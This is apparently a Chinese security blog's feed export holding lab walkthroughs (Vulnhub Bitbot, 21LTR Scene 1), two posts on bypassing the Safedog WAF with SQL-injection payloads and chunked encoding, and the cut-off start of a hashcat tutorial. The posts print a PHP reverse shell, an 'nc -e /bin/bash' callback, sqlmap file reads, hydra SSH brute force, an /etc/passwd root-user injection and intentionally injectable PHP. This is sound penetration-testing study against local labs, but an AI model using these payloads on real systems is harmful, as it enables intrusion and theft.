rel="noopener">https://www.exploit-db.com/exploits/27750</a></li><li><a href="https://threatvector.cylance.com/en_us/home/a-study-in-bots-bitbot.html" target="_blank" rel="noopener">https://threatvector.cylance.com/en_us/home/a-study-in-bots-bitbot.html</a></li><li>查看到gate2.php文件与刚扫目录扫出来的相符</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/13.png" alt></li><li>有注入，访问 <a href="http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info" target="_blank" rel="noopener">http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info</a></li><li>sqlmap -u “<a href="http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;" target="_blank" rel="noopener">http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;</a></li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/14.png" alt></li><li>读服务器文件：sqlmap -u “<a href="http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;" target="_blank" rel="noopener">http://192.168.100.31/gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info&quot;</a> –dbms=mysql –method=GET –file-read=/var/www/admin.php</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/15.png" alt></li><li>读config.php</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/16.png" alt></li><li>得账号：botter</li><li>密码：IF I CAME UP WITH UNIQUE PASSWORDS, I WOULD BE HOME BY NOW</li><li>登录web</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/17.png" alt></li><li>web里存在命令执行界面</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/18.png" alt></li><li>kali本地使用Python临时搭建http服务器，目的就是让靶机访问临时服务器来下载木马文件。</li><li>python -m simplehttpserver 8000  # ctrl+c 关闭</li><li>临时http服务器准备个php的反弹shell脚本：<pre><code>&lt;?php set_time_limit(0);$fp=@fsockopen(&quot;本地主机IP&quot;,8888);while(!feof($fp)){fputs($fp,&quot;shell:&quot;);$shell=fgets($fp);$message=`$shell`;fputs($fp,$message);}fclose($fp);?&gt;</code></pre></li><li>DOWN <a href="http://192.168.100.4:8000/nc.php" target="_blank" rel="noopener">http://192.168.100.4:8000/nc.php</a>  #点击add，没反应，半天没反弹shell，php怎么执行嘛</li><li>又上传了py的shell、exe的shell，都不行。</li></ol><h2 id="0x03-再来"><a href="#0x03-再来" class="headerlink" title="0x03 再来"></a>0x03 再来</h2><ol><li>重启靶机之后，offline的状态变成online了，原来如此，之前的都在瞎搞了。</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/19.png" alt></li><li>kali开启监听：nc -lvp 8888，又上传前面的php反弹shell脚本，还是没反弹。</li><li>上传Python脚本</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/20.png" alt></li><li>试了N次，终于行了</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/21.png" alt></li><li>nc正连shell</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/22.png" alt></li><li>找到当前用户当前目录下有个gen.sh并读取它</li><li>一步步理解gen.sh的作用</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/23.png" alt></li><li>最后的结果为addr:192.168.100.310.XX，输出到passwd来改密码，XX不确定</li><li>列出部分密码，用hydra爆破</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/24.png" alt></li><li>hydra -f -l root -P passwd.txt -e nsr ssh://192.168.100.31 #-f 账号密码正确就退出</li><li>得密码</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/25.png" alt></li><li>登录ssh</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/26.png" alt></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://frequentlyinaccurate.net/2016/08/vulnhub-flipping-bitbot/" target="_blank" rel="noopener">https://frequentlyinaccurate.net/2016/08/vulnhub-flipping-bitbot/</a></li><li><a href="http://www.cyberry.co.uk/vulnhub/bot-challenges-flipping-bitbot/" target="_blank" rel="noopener">http://www.cyberry.co.uk/vulnhub/bot-challenges-flipping-bitbot/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 僵尸网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之21LTLTR_Scene_1</title>
      <link href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"/>
      <url>/vulnhub%E4%B9%8B21LTLTR-Scene-1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol><li><a href="https://www.vulnhub.com/entry/21ltr-scene-1,3/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/21ltr-scene-1,3/</a></li><li>kali：192.168.2.1</li><li>因为靶场ip是静态ip：192.168.2.120</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/1.png" alt></li><li>所以虚拟机配置网卡</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/2.png" alt></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/3.png" alt></li></ol><h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><ol><li>nmap -sV 192.168.2.120 -p 1-65535</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/4.png" alt></li><li>访问<a href="http://192.168.2.120/" target="_blank" rel="noopener">http://192.168.2.120/</a></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/5.png" alt></li><li>查看网页源代码</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/6.png" alt></li><li>得username:logs password:zg]E-b0]+8:(58G</li><li>nmap扫到端口21、22、80，尝试登陆ftp</li><li>ftp 192.168.2.120</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/7.png" alt></li><li>?  #查看帮助命令</li><li>dir 或 ls  #列目录</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/8.png" alt></li><li>有敏感文件backup_log.php，下载下来</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/9.png" alt></li><li>读backup_log.php</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/10.png" alt></li><li>emmm，没啥东西，测试一下<a href="http://192.168.2.120/123456789" target="_blank" rel="noopener">http://192.168.2.120/123456789</a></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/11.png" alt></li><li>重新下载backup_log.php，随便改个名1.php，再读</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/12.png" alt></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/13.png" alt></li><li>没啥变化，扫目录</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/14.png" alt></li><li>存在/logs/，访问403，继续扫 <a href="http://192.168.2.120/logs/" target="_blank" rel="noopener">http://192.168.2.120/logs/</a> 目录，毛都没</li><li>尝试访问 <a href="http://192.168.2.120/logs/backup_log.php" target="_blank" rel="noopener">http://192.168.2.120/logs/backup_log.php</a> ，有东西</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/15.png" alt></li><li>没啥有用的东西~</li><li>ssh登录，失败！告辞。</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/17.png" alt></li></ol><h2 id="0x02-再来"><a href="#0x02-再来" class="headerlink" title="0x02 再来"></a>0x02 再来</h2><ol><li>nmap -sT -p0-65535 192.168.2.120 #之前nmap试过扫全端口，就是扫不出来，有毒</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/16.png" alt></li><li>scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</li><li>使用nc -n -v 192.168.2.120 10001 #空白shell，连接192.168.2.120的10001端口 -v：显示详情，-n：指定ip地址，不通过DNS，（PS：10001有时open，有时close，很坑）</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/18.png" alt></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/19.png" alt></li><li><strong>插曲：nc扫描端口</strong></li><li>nc -v -n -z IP 1-65535 #tcp</li><li>nc -v -n -z -u IP 1-65535 #udp</li><li>写入php代码</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/20.png" alt></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/21.png" alt></li><li>先打开监听，nc -lvp 8888</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/22.png" alt></li><li>反弹shell，nc -e /bin/bash 192.168.2.1 8888</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/23.png" alt></li><li>连接到反弹shell</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/24.png" alt></li><li>获取交互shell</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/25.png" alt></li></ol><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><ol><li>目前得到的shell是/bin/false，切换不了</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/26.png" alt></li><li>有3个普通用户，翻系统文件，查找777文件：find / -perm 777 -type f</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/27.png" alt></li><li>找到个id_rsa，authorized_keys，查看</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/28.png" alt></li><li>复制，保存到本地，私钥权限设为600，使用私钥登录，碰到一<strong>坑</strong></li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/29.png" alt></li><li>删除 rm -rf ~/.ssh/known_hosts，或执行ssh-keygen -f “/root/.ssh/known_hosts” -R”192.168.2.120”，再登录</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/30.png" alt></li><li>id #查看权限</li><li>sudo -l #列出哪些命令是以root权限执行的</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/31.png" alt></li><li>openssl passwd生成密码</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/33.png" alt></li><li>openssl passwd -1 -salt admin password</li><li>#-1：是数字1，基于MD5的密码算法</li><li>#-salt：加盐，admin</li><li>#password：密码</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/32.png" alt></li><li>使用具有root权限的cat命令来编辑/etc/passwd：sudo /usr/bin/cat &gt;&gt;/etc/passwd</li><li>添加admin:$1$admin$mZhVCYpQb/nUmzdFCQFBs0:0:0:/root:/bin/bash</li><li>ctrl+c</li><li><img src="/vulnhub%E4%B9%8B21LTLTR-Scene-1/34.png" alt></li><li>得root shell。</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.hackingarticles.in/hack-the-21ltr-scene-1-vm-boot-to-root/" target="_blank" rel="noopener">https://www.hackingarticles.in/hack-the-21ltr-scene-1-vm-boot-to-root/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕WAF之safedog</title>
      <link href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"/>
      <url>/%E7%BB%95WAF%E4%B9%8Bsafedog/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol><li>任何防御或多或少都存在防护弱点，针对看起来坚不可摧的防御，尝试查找其弱点，才能改善防御，毕竟最有效的防御措施是进攻。——好像有点道理</li></ol><h2 id="0x10-环境"><a href="#0x10-环境" class="headerlink" title="0x10 环境"></a>0x10 环境</h2><ol><li>windows server 2008</li><li>phpstudy</li><li>safedog Apache 4.0.26550正式版</li><li>本地的网（靶）站（场），代码：</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/12.png" alt></li></ol><h2 id="0x20-测试and与or"><a href="#0x20-测试and与or" class="headerlink" title="0x20 测试and与or"></a>0x20 测试and与or</h2><ol><li>防火墙单项and、or测试</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/13.png" alt></li><li>正常访问：<a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/2.png" alt></li><li>开启拦截，带敏感关键字访问：and 1=1，拦截了</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/3.png" alt></li><li></li><li><strong>各种拦截测试</strong></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/5.png" alt></li><li>and 1</li><li>and 1=</li><li>and ‘=’</li><li>and ‘1’</li><li>and ‘a’</li><li>and ‘a’=’a’</li><li>and 1=11</li><li>and 2&gt;1</li><li>and 1*1</li><li>and 1*1=1</li><li>and 1+1</li><li>and 1+a</li><li>and 1^1</li><li>and <del>=</del></li><li>&amp;&amp; 1=1</li><li></li><li><strong>各种不拦截测试</strong></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/1.png" alt></li><li>and</li><li>and -0=-0</li><li>and ~1=~1</li><li>and -2&lt;-1</li><li>and !</li><li>and 1a</li><li>and 1a=</li><li>and a+1</li><li>and hex(1)</li><li>and ord(100)</li><li>and oct(100)</li><li>and bin(100)</li><li>&amp;&amp; true</li><li>&amp;&amp; false</li><li>|| true</li><li>|| false</li><li>and 0x01 &lt;&gt; 0x02</li><li>and 0x2 &lt;=&gt; 0x2</li><li>and 0x2 xor 0x1</li><li>and binary 1</li><li>and binary 0</li><li>and conv(0,3,2)</li><li>and conv(1,3,2)</li><li>and concat(1)</li><li>and concat(0)</li><li></li><li>使用各种函数</li><li>替换敏感字符例如：|、||、&amp;、&amp;&amp;、^、xor、/、*、！、&lt;&gt;、&lt;=&gt;等</li><li>以及它们的URL编码，如&amp;&amp;：%26%26（mysql支持&amp;&amp;、||，Oracle不支持）</li><li>关键字符大小写</li><li>用true或false代替1或0,1=1或1=0</li><li>注释：%23、#、–、– -、–+</li><li>/**/、/*!*/</li></ol><h2 id="0x30-order-by-测试"><a href="#0x30-order-by-测试" class="headerlink" title="0x30 order by 测试"></a>0x30 order by 测试</h2><ol><li>正常情况下，列数为3</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/9.png" alt></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/10.png" alt></li><li>开启safedog，拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/11.png" alt></li><li><strong>内联绕过</strong></li><li><a href="http://192.168.100.3/sql.php?id=1/*!04400order" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1/*!04400order</a> by*/ 3</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/14.png" alt></li><li>匹配04400，爆破1位数到多位数能绕过的数字</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/15.png" alt></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/16.png" alt></li><li><strong>注释换行绕过</strong></li><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> order%23%0aby 3</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/17.png" alt></li><li>爆破%00-%ff</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/18.png" alt></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/19.png" alt></li><li>其他注释</li><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> order– -%0aby 3</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/20.png" alt></li></ol><h2 id="0x40-union-selct-测试"><a href="#0x40-union-selct-测试" class="headerlink" title="0x40 union selct 测试"></a>0x40 union selct 测试</h2><ol><li><strong>内联绕过</strong></li><li><a href="http://192.168.100.3/sql.php?id=1/*!04400union*//*!04400select*/1,2,3" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1/*!04400union*//*!04400select*/1,2,3</a></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/21.png" alt></li><li><strong>注释换行绕过</strong></li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/22.png" alt></li><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union%23qwe%0aselect 1,2,3</li><li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/23.png" alt></li><li><strong>union all select</strong></li><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union%23%0aall select 1,2,3</li><li><strong>union distinct select</strong></li><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union distinct%23%0a select 1,2,3</li><li><strong>union distinctrow select</strong></li><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union distinctrow%23%0a select 1,2,3</li></ol><h2 id="0x50-查库表列数据"><a href="#0x50-查库表列数据" class="headerlink" title="0x50 查库表列数据"></a>0x50 查库表列数据</h2><ol><li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union all%23%0a select 1,2,database%23%0a(%0a)</li><li></li></ol><h2 id="0xF0-特殊字符"><a href="#0xF0-特殊字符" class="headerlink" title="0xF0 特殊字符"></a>0xF0 特殊字符</h2><pre><code>`!@#$%^&amp;*()_+{}:&quot;&quot;&#39;&#39;;[]/?.&lt;&gt;,~·\|=-</code></pre><h2 id="0xFE-测试代码"><a href="#0xFE-测试代码" class="headerlink" title="0xFE 测试代码"></a>0xFE 测试代码</h2><pre><code>&lt;?php    $id=$_GET[&#39;id&#39;];    $conn=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);    if(!conn){        die(&#39;Could not connect : &#39;.mysql_error());    }    mysql_select_db(&quot;security&quot;,$conn);    $query=&quot;select username,password from users where id=&#39;$id&#39;;&quot;;    $result=mysql_query($query) or die(&#39;&lt;pre&gt;.mysql_error().&lt;/pre&gt;&#39;);    while($row=mysql_fetch_array($result)){        echo &quot;username: &quot;.$row[0].&quot;&lt;br/&gt;&quot;.&quot;password: &quot;.$row[1];        echo &quot;&lt;br/&gt;&quot;;    }    echo &quot;&lt;br/&gt;&quot;;    echo $query;    mysql_close($conn)?&gt;</code></pre><pre><code>&lt;?php error_reporting(E_ALL^E_DEPRECATED);$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);if(!$connect){    die(&quot;Could not connect: &quot;.mysql_error());}mysql_select_db(&quot;security&quot;,$connect);$id=$_REQUEST[&#39;id&#39;];$query=&quot;select * from users where id=$id&quot;;$result=mysql_query($query);while($row=mysql_fetch_array($result)){    echo $row[&#39;0&#39;].&quot; &quot;.$row[&#39;1&#39;].&quot; &quot;.$row[&#39;2&#39;];    echo &quot;&lt;br /&gt;&quot;;}echo &quot;&lt;br /&gt;&quot;;echo $query;mysql_close($connect);?&gt;</code></pre><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li><li><a href="https://louisnie.github.io/2019/07/04/%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" target="_blank" rel="noopener">https://louisnie.github.io/2019/07/04/%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕WAF之分块传输</title>
      <link href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"/>
      <url>/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前排留言"><a href="#0x00-前排留言" class="headerlink" title="0x00 前排留言"></a>0x00 前排留言</h2><ol><li>只分析技术，不存在抹黑。</li></ol><h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><ol><li>win2008+phpstudy+靶场sqli_labs+dog_apache_免费版应用防火墙</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/1.png" alt></li><li>开启拦截之前，访问<a href="http://192.168.10.8/sqli-labs/Less-11/，登录窗账号输入&#39;" target="_blank" rel="noopener">http://192.168.10.8/sqli-labs/Less-11/，登录窗账号输入&#39;</a> or ‘1’=’1#，密码输入任意密码1，都能显示登录成功</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/2.png" alt></li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/3.png" alt></li><li>查看关键代码</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/4.png" alt></li><li>账号密码输入之后，sql查询语句如下：</li><li>@$sql=”SELECT username, password FROM users WHERE username=’’ or ‘1’=’1#’ and password=’1’ LIMIT 0,1”; </li><li>#的作用就是注释了后面的内容’ and password=’1’ LIMIT 0,1”;</li><li>实际sql语句是：@$sql=”SELECT username, password FROM users WHERE username=’’ or ‘1’=’1#，所以恒成立</li><li>开启拦截之后，再登录试试，被拦截了</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/5.png" alt></li></ol><h2 id="0x02-日常请求"><a href="#0x02-日常请求" class="headerlink" title="0x02 日常请求"></a>0x02 日常请求</h2><ol><li>原理：使用http协议与服务器建立连接时，首先建立tcp连接（三次握手），再发送http数据包，burpsuite抓数据包就可以看到关键字段：Connection，数据发送完成后，值就是close，如果数据内容较大，超出一个http包的容量，则值为keep-alive，即保持连接，直至发送内容完毕。</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/6.png" alt></li><li>带敏感字符访问，被拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/7.png" alt></li><li>复制整个被拦截的数据请求包，把敏感字符删除，再发送一次，显示正常的，然后把复制的请求包粘贴到post内容后</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/9.png" alt></li><li>然后把Connection的值改为keep-alive，把Update Connection-Length的默认勾选去掉，不勾选</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/8.png" alt></li><li>再发送请求包，看到两个响应包，一个正常，一个拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/10.png" alt></li></ol><h2 id="0x03-尝试分块绕过"><a href="#0x03-尝试分块绕过" class="headerlink" title="0x03 尝试分块绕过"></a>0x03 尝试分块绕过</h2><ol><li>利用分块编码传输绕过，在请求头添加字段<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">Transfer-Encoding: chunked</a>，就是数据分块发送，Content-Length在这种情况下不被发送，而是在每个分块的开头需要加当前分块的长度，以16进制的形式表示，后面紧接\r\n（回车换行），之后是分块本身。终止块是一个长度为0的分块，空两行代表数据包结束。</li><li>开启前面不更新内容长度的设置，即勾选Update Connection-Length</li><li>发包被拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/11.png" alt></li><li>分块，然后正常请求而不被拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/12.png" alt></li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/13.png" alt></li><li>现在使用常规的分块传输去绕过，会被WAF直接识别且拦截。</li></ol><h2 id="0x04-使用注释混淆分块数据包"><a href="#0x04-使用注释混淆分块数据包" class="headerlink" title="0x04 使用注释混淆分块数据包"></a>0x04 使用注释混淆分块数据包</h2><ol><li><a href="https://tools.ietf.org/html/rfc7230#section-3.3.1" target="_blank" rel="noopener">RFC 7230, section 3.3.1: Transfer-Encoding</a></li><li>通过;注释来混淆代码，干扰WAF识别</li><li><strong>例子</strong></li><li>Transfer-Encoding: chunked</li><li></li><li>7</li><li>abcdefg</li><li>7</li><li>hijklmn</li><li>1</li><li>a</li><li>9;qwead123</li><li>&amp;b=1 and</li><li>3;123qweasd</li><li>1=1</li><li>0</li><li></li><li></li></ol><h2 id="0x5-利用协议未覆盖与分块编码绕过"><a href="#0x5-利用协议未覆盖与分块编码绕过" class="headerlink" title="0x5 利用协议未覆盖与分块编码绕过"></a>0x5 利用协议未覆盖与分块编码绕过</h2><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type" target="_blank" rel="noopener">Content-Type</a>，一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种。</li><li>multipart/form-data：表单数据编码为一条消息，每个控件对应消息的一部分。当WAF没有规则匹配该协议时，传输的数据就可被绕过。</li><li>自定义Content-Type: multipart/form-data; boundary=something</li><li>正常拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/14.png" alt></li><li>正常分割（其实就是改变正文编码），还是拦截</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/15.png" alt></li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/16.png" alt></li><li>分块，正常</li><li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/17.png" alt></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">https://www.freebuf.com/news/193659.html</a></li><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169738</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashcat</title>
      <link href="/hashcat/"/>
      <url>/hashcat/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol><li>hashcat号称世界上最快的密码破解，世界上第一个和唯一的基于GPGPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（Linux和Windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等等。</li></ol><h2 id="0x01-hashcat"><a href="#0x01-hashcat" class="headerlink" title="0x01 hashcat"></a>0x01 <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></h2><ol><li>hashcat -h/--help #查看帮助信息</li><li><img src="/hashcat/2.png" alt></li><li><img src="/hashcat/5.png" alt></li><li><img src="/hashcat/3.png" alt></li><li><strong>MD5例子:</strong></li><li>hashcat64.exe -a 3 -m 0 –force 77a42b0ff9a96e60736db9ed3ad632c0 #明文密码：txtxtx，-a：破解方式，3代表爆破，-m：hash ID，0代表MD5，–force：忽视警告，77a42b0ff9a96e60736db9ed3ad632c0：MD5</li><li><img src="/hashcat/1.png" alt></li><li><strong>破解7为数字</strong></li><li>hashcat64.exe -a 3 -m 0 –force 522deb70218b46326766d77209164eda ?d?d?d?d?d?d?d</li><li><img src="/hashcat/4.png" alt></li><li></li><li><strong>6-8位数字</strong></li><li>hashcat64.exe -a 3 -m 0 –force 0197100d296692fdca8d706d3c0f011d –increment –increment-min=6 –increment-max=8 ?d?d?d?d?d?d?d?d</li><li><img src="/hashcat/7.png" alt></li><li></li><li><strong>由0123456789abcdef组成的12位</strong></li><li>hashcat64.exe -a 3 -m 0 –force 0a3b74fc33bec931869c8b030df73e17 –increment –increment-min=8 –increment-max=12 ?h?h?h?h?h?h?h?h?h?h?h?h</li><li>等很久，图略</li><li></li><li><strong>特定字符集：123456abcdf!@+-</strong></li><li>hashcat64.exe -a 3 -1 123456abcdf!@+- d192b4f361f6895c3f9be590d432d79f ?1?1?1?1?1?1</li><li>-1和?1，是数字1</li><li><img src="/hashcat/8.png" alt></li><li></li><li><strong>6-8为位符集:123456abcdf!@.</strong></li><li>hashcat64.exe -a 3 -1 123456abcdf!@. 